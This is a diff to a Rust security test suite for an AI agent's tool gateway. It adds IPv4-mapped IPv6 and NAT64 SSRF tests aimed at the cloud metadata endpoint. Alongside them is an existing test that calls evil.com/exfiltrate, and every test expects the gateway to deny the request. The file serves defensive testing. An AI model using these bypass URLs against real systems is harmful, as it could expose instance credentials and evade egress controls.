@@ -7,10 +7,10 @@
 //
 //     http://www.apache.org/licenses/LICENSE-2.0
 
-//! A9: SSRF & Domain Bypass — 6 tests
+//! A9: SSRF & Domain Bypass — 8 tests
 //!
 //! Tests the gateway's ability to correctly extract and evaluate
-//! domains from URLs, including bypass techniques.
+//! domains from URLs, including IPv6/NAT64 bypass techniques.
 
 use super::{is_deny, AttackTest};
 use serde_json::json;
@@ -74,6 +74,28 @@ pub fn tests() -> Vec<AttackTest> {
             payload: json!({
                 "tool": "http", "function": "request",
                 "parameters": {"url": "https://evil.com:8080/exfiltrate"}
+            }),
+            check_fn: is_deny,
+        },
+        AttackTest {
+            id: "A9.7",
+            name: "IPv4-mapped IPv6 SSRF",
+            class: "SSRF & Domain Bypass",
+            payload: json!({
+                "tool": "http", "function": "request",
+                // ::ffff:169.254.169.254 — IPv4-mapped IPv6 representation of metadata endpoint
+                "parameters": {"url": "http://[::ffff:169.254.169.254]/latest/meta-data/"}
+            }),
+            check_fn: is_deny,
+        },
+        AttackTest {
+            id: "A9.8",
+            name: "NAT64 well-known prefix SSRF",
+            class: "SSRF & Domain Bypass",
+            payload: json!({
+                "tool": "http", "function": "request",
+                // 64:ff9b::169.254.169.254 — NAT64 well-known prefix (RFC 6052)
+                "parameters": {"url": "http://[64:ff9b::a9fe:a9fe]/latest/meta-data/"}
             }),
             check_fn: is_deny,
         },
